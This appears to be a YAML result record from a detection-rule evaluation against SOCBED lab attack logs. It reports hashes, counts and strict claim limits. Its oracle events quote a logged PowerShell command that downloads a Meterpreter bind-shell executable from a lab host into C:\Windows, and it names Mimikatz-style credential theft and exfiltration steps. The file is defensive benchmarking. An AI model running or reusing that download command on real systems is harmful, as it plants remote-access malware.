@@ -1,0 +1,195 @@
+schema: breachscope.p2_35f_socbed_source_oracle_result.v1
+analysis_id: p2-35f-socbed-source-derived-oracle-v1
+status: COMPLETED
+contract: external_baseline/p2_35f_socbed_source_oracle_contract.yaml
+contract_merge_commit: 8270c8417b2d0df54666234ed1d05c0981d094e1
+canonical_repo_commit: 8270c8417b2d0df54666234ed1d05c0981d094e1
+predecessor:
+  phase: P2-35E
+  result: external_baseline/p2_35e_socbed_timeline_one_pass_result.yaml
+  result_main_commit: eb2c74768e7e3369fdc0329f273cb75ba0818992
+  p2_35e_must_remain_immutable: true
+frozen_product:
+  repo_commit: 3ca80865477cccfa5e967f549acf32d92182eccd
+  breachscope_and_rules_match_frozen_commit: true
+  rules_tree_sha256: ac5b6f1db7af2208910e9a7954b414d21c6ef019dfcdf29ddfdd566cd77a9326
+  rule_file_count: 5
+runner:
+  sha256: 6010438daef731096045fa4ebb789d09562d0b0a886e2c3ed98f3f965a57eae5
+  contract_sha256: 35a4a93b316d9321f612861e90aba32d2baba3a0ff13a94da5b432fcdd11924b
+  predecessor_runner_sha256: bffd71419b11ad6e2ac1032ccfe904d7844e3a3a9f6159d6d9e7adeeeb83fca3
+  global_lock_file: external_baseline/locks/P2_35F_ONE_PASS.lock
+  global_lock_scope: ANALYSIS_ID_REPOSITORY_GLOBAL
+source:
+  archive_size_bytes: 77984817
+  archive_sha256: 7eda65f08bbe6f274c1feff178ae132cfd0e8edbdf0a10ef08321259b6facc54
+  selected_windows_member:
+    path: host1_bestpractice/winlogbeat_01.jsonl
+    size_bytes: 21081975
+    sha256: d648be6ac0acd18a354e0e1b497800d9d41d2a511afe21308ca3c2a0b679064d
+  timing_anchor_member:
+    path: host1_bestpractice/attackconsole_01.log
+    size_bytes: 6536
+    sha256: e843ab909b729709b893fedc4a81c00d8d0336ff745fe05febc52ba00e9668b7
+canonical_artifacts:
+  result:
+    path: external_baseline/results/p2_35f_8270c84/result.json
+    size_bytes: 8200
+    sha256: f68eb1ecaa38a47ffb721ffb89f91c32fe92b57900f71e986e6175a023d0e215
+  permanent_global_lock:
+    path: external_baseline/locks/P2_35F_ONE_PASS.lock
+    size_bytes: 108
+    sha256: 49e55abd30899c7b25a6d68e7e5d9e1832e085fdd1dad43ef27cba0f32424969
+    analysis_id: p2-35f-socbed-source-derived-oracle-v1
+measurement:
+  raw_jsonl_rows: 9370
+  events: 9369
+  findings: 29
+  evaluated_action_count: 3
+  actions_with_frozen_oracle_predicate_matches: 1
+  actions_with_findings_bound_to_matched_oracle_events: 1
+  matched_oracle_event_count: 5
+  matched_oracle_events_with_findings: 5
+  evaluated_actions:
+    misc_download_malware:
+      predicate_id: DOWNLOAD_POWERSHELL_EXACT_SOURCE_TOKENS_V1
+      predicate_match_count: 5
+      matched_events_with_findings: 5
+      finding_count_on_matched_oracle_events: 5
+      finding_rule_ids_on_matched_oracle_events:
+      - R-DL
+      finding_techniques_on_matched_oracle_events:
+      - T1105
+      frozen_predicate_match_observed: true
+      finding_binding_observed: true
+      oracle_events:
+      - timestamp: '2021-06-18T13:03:50.027Z'
+        host: CLIENT1.breach.local
+        source: PowerShell
+        event_id: '800'
+        event_record_id: '6029'
+        image: ''
+        command_line: powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\Windows\meterpreter_bind_tcp.exe'
+        target_object: ''
+        details: ''
+      - timestamp: '2021-06-18T13:03:50.027Z'
+        host: CLIENT1.breach.local
+        source: PowerShell
+        event_id: '403'
+        event_record_id: '6030'
+        image: ''
+        command_line: powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\Windows\meterpreter_bind_tcp.exe'
+        target_object: ''
+        details: ''
+      - timestamp: '2021-06-18T13:03:50.034Z'
+        host: CLIENT1.breach.local
+        source: Microsoft-Windows-PowerShell
+        event_id: '4103'
+        event_record_id: '5525'
+        image: ''
+        command_line: powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\Windows\meterpreter_bind_tcp.exe'
+        target_object: ''
+        details: ''
+      - timestamp: '2021-06-18T13:03:50.035Z'
+        host: CLIENT1.breach.local
+        source: Microsoft-Windows-PowerShell
+        event_id: '4103'
+        event_record_id: '5526'
+        image: ''
+        command_line: powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\Windows\meterpreter_bind_tcp.exe'
+        target_object: ''
+        details: ''
+      - timestamp: '2021-06-18T13:03:50.027Z'
+        host: CLIENT1.breach.local
+        source: PowerShell
+        event_id: '800'
+        event_record_id: '6028'
+        image: ''
+        command_line: powershell -Command Invoke-WebRequest 'http://172.18.1.1/meterpreter_bind_tcp.exe' -OutFile 'C:\Windows\meterpreter_bind_tcp.exe'
+        target_object: ''
+        details: ''
+    misc_set_autostart:
+      predicate_id: AUTOSTART_RUN_KEY_EXACT_SOURCE_TOKENS_V1
+      predicate_match_count: 0
+      matched_events_with_findings: 0
+      finding_count_on_matched_oracle_events: 0
+      finding_rule_ids_on_matched_oracle_events: []
+      finding_techniques_on_matched_oracle_events: []
+      frozen_predicate_match_observed: false
+      finding_binding_observed: false
+      oracle_events: []
+    misc_execute_malware:
+      predicate_id: PROCESS_CREATE_EXACT_MALWARE_IMAGE_V1
+      predicate_match_count: 0
+      matched_events_with_findings: 0
+      finding_count_on_matched_oracle_events: 0
+      finding_rule_ids_on_matched_oracle_events: []
+      finding_techniques_on_matched_oracle_events: []
+      frozen_predicate_match_observed: false
+      finding_binding_observed: false
+      oracle_events: []
+  not_evaluated_actions:
+    misc_sqlmap:
+      disposition: NOT_EVALUATED_NO_SELECTED_WINDOWS_EVENT_ORACLE
+      reason: The pinned source performs SQL injection from the attacker against the DVWA Linux web server; the selected data
+        source is one Windows Winlogbeat member, so absence of a Windows event cannot be treated as a detection miss.
+    infect_email_exe:
+      disposition: NOT_EVALUATED_NO_SELECTED_WINDOWS_EVENT_ORACLE
+      reason: The pinned source generates and sends a malicious attachment but does not define recipient-side attachment execution
+        as part of this attack action.
+    c2_take_screenshot:
+      disposition: NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE
+      reason: The pinned source performs a Meterpreter screenshot in an existing C2 session; the pinned collector configuration
+        does not define one deterministic Windows event that is guaranteed to identify this action.
+    c2_exfiltration:
+      disposition: NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE
+      reason: The pinned source collects remote DOC files through Meterpreter; the selected client Winlogbeat member does
+        not provide a predeclared deterministic event identity for this action.
+    c2_mimikatz:
+      disposition: NOT_EVALUATED_NO_DETERMINISTIC_EVENT_ORACLE
+      reason: The pinned source loads Meterpreter kiwi and runs creds_all. The pinned Sysmon ProcessAccess section has an
+        empty include, so a credential-access event cannot be assumed as a deterministic oracle.
+raw_metadata_issue:
+  present: true
+  field: claim_boundary.source_derived_oracle_event_binding
+  raw_value: NOT_YET_MEASURED
+  expected_postmeasurement_state: MEASURED_FOR_THREE_PREREGISTERED_SOURCE_DERIVED_PREDICATES
+  cause: runner copied the preregistration claim_boundary object unchanged into the completed raw result
+  canonical_raw_modified: false
+  canonical_rerun_performed: false
+  interpretation: measurement outputs are preserved as canonical; this summary corrects only the postmeasurement status label
+    and does not alter any measurement value
+protocol:
+  permanent_analysis_id_global_lock_used: true
+  first_lock_acquired_execution_retained_as_canonical: true
+  duplicate_p2_35f_canonical_execution_performed: false
+  replace_result_for_better_outcome: false
+  same_analysis_id_retry_allowed: false
+  product_or_rules_modified_after_canonical: false
+  p2_35e_artifacts_modified: false
+  raw_canonical_result_modified: false
+decision:
+  canonical_execution: COMPLETED
+  three_source_derived_windows_actions_evaluated: true
+  frozen_predicate_match_actions: 1_OF_3
+  exact_finding_binding_actions: 1_OF_3
+  misc_download_malware: PREDICATE_MATCHED_AND_FINDING_BOUND
+  misc_set_autostart: NO_MATCH_FOR_PREREGISTERED_PREDICATE
+  misc_execute_malware: NO_MATCH_FOR_PREREGISTERED_PREDICATE
+  eight_attack_recall_claim_authorized: false
+  precision_or_recall_claim_authorized: false
+  general_detection_accuracy_claim_authorized: false
+claim_boundary:
+  evaluated_actions: THREE_SOURCE_DERIVED_WINDOWS_ACTIONS_ONLY
+  source_derived_oracle_event_binding: MEASURED_FOR_THREE_PREREGISTERED_SOURCE_DERIVED_PREDICATES
+  frozen_predicate_match_counts_are_attack_recall: false
+  attack_level_precision: NOT_EVALUATED
+  attack_level_recall: NOT_EVALUATED
+  event_level_precision: NOT_EVALUATED
+  event_level_recall: NOT_EVALUATED
+  non_evaluated_action_detection_quality: NOT_EVALUATED
+  eight_attack_recall: NOT_EVALUATED
+  independent_holdout_performance: NOT_EVALUATED
+  general_detection_accuracy: NOT_CLAIMED
+  production_reconstruction_quality: NOT_CLAIMED
+  statistical_benchmark: false
